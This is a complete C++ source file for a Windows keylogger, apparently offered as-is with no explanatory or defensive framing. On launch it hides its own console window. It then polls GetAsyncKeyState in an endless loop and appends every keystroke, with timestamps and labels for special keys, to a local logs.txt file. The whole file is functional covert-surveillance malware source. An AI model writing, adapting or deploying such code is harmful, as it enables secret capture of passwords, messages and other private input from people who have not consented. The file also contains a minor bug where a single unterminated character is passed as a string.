#include <windows.h>
#include <fstream>
#include <thread>
#include <chrono>
#include <ctime>
#include <string>

std::string currentDateTime()
{
    std::time_t t { std::time(nullptr) };
    std::tm* now { std::localtime(&t) };

    char buffer[128];
    strftime(buffer, sizeof(buffer), "%m-%d-%Y %X", now);

    return buffer;
}

void writeToLog(auto text)
{
    std::ofstream fileStream;

    fileStream.open("logs.txt", std::fstream::app);
    fileStream << "[" << currentDateTime() << "] > " << text << "\n";
    fileStream.close();
}

bool writeKey(unsigned char keyChar)
{
    switch(keyChar)
    {
        case 1:           break;
        case 2:           break;
        case 8:           writeToLog("[BKSPC]");      break;
        case 13:          writeToLog("[RET]");        break;
        case 32:          writeToLog("[SPACE]");      break;
        case 18:          writeToLog("[ALT]");        break;
        case VK_TAB:      writeToLog("[TAB]");        break;
        case VK_SHIFT:    writeToLog("[SHIFT]");      break;
        case VK_CONTROL:  writeToLog("[CTRL]");       break;
        case VK_ESCAPE:   writeToLog("[ESC]");        break;
        case VK_END:      writeToLog("[END]");        break;
        case VK_HOME:     writeToLog("[HOME]");       break;
        case VK_LEFT:     writeToLog("[LEFT KEY]");   break;
        case VK_UP:       writeToLog("[UP KEY]");     break;
        case VK_RIGHT:    writeToLog("[RIGHT KEY]");  break;
        case VK_DOWN:     writeToLog("[DOWN KEY]");   break;
        
        default:          writeToLog(&keyChar);
    }

    return true;
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (true)
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(10));

        for (int asciiVal { 8 }; asciiVal <= 255; ++asciiVal)
        {
            if (GetAsyncKeyState(asciiVal) == -32767)
            {
                if (asciiVal < 128)
                    writeKey(static_cast<unsigned char>(asciiVal));
                else
                    writeToLog("[" + std::to_string(asciiVal) + "]");
            }
        }
    }

    return 0;
}


